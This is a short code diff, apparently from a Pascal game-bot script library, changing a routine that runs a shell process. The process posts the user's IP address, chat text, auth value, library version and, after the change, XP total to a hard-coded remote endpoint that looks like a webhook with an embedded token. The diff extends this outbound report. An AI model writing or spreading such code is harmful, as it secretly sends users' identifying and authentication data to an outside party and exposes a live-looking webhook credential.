@@ -70,11 +70,12 @@ var
   process:TProcess;
   s:string;
 begin
+  IsUpTextMulti(['i']);
   if not IPLogged then exit;
   if not TabChecked then
   try
   process.init(nil);
-  s := DProcessString+'---\n['+ FormatDateTime('tt', Time) + ']\nIP: ' + IP +'\nC: '+GetChatBoxTextEx(9, 0)+'\n#: '+Auth+'\nVer: '+Danlib_Version+'\n---\" }" '+DA+INTSTR+'690130446188806176/7RRfd-HOWraEBpzIHOiKA5HECvwosK4XuZSMmN2Qz7tgA7LX42MiLjwaF1pnrTGyITQO';
+  s := DProcessString+'-[['+ FormatDateTime('tt', Time) + '] [IP: ' + IP +'] [C: '+GetChatBoxTextEx(9, 0)+'] [#: '+Auth+'] [Ver: '+Danlib_Version+'] [Total XP - ' +IntToStr(GetXPBarAmountEx)+']]-\" }" '+DA+INTSTR+'690130446188806176/7RRfd-HOWraEBpzIHOiKA5HECvwosK4XuZSMmN2Qz7tgA7LX42MiLjwaF1pnrTGyITQO';
   process.setcommandline(s);
   process.Execute();
   process.free();
